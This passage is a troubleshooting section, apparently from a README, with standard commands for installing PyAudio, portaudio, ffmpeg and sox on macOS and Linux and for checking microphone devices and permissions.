### Troubleshooting

**Issue: "Audio recording requires dependencies"**

The audio feature supports multiple methods with automatic fallback:

**Method 1: PyAudio (Cross-platform)**

```bash
# macOS
brew install portaudio
pip3 install pyaudio

# Ubuntu/Debian
sudo apt-get install portaudio19-dev python3-pyaudio
pip3 install pyaudio

# Fedora/CentOS
sudo dnf install portaudio-devel
pip3 install pyaudio
```

**Method 2: System Commands (Fallback)**

- macOS: Uses `sox` or `ffmpeg`
- Linux: Uses `arecord` or `ffmpeg`
- Windows: Requires `ffmpeg`

```bash
# Install ffmpeg
# macOS
brew install ffmpeg

# Ubuntu/Debian
sudo apt-get install ffmpeg

# Fedora/CentOS
sudo dnf install ffmpeg

# macOS (sox alternative)
brew install sox
```

**Issue: "No microphone detected"**

```bash
# Linux - list audio devices
arecord -l

# macOS - check microphone permissions
System Preferences > Security & Privacy > Privacy > Microphone
Add Terminal or Python

# Windows
Settings > Privacy > Microphone
Allow apps to access your microphone
```

**Issue: Poor audio quality**
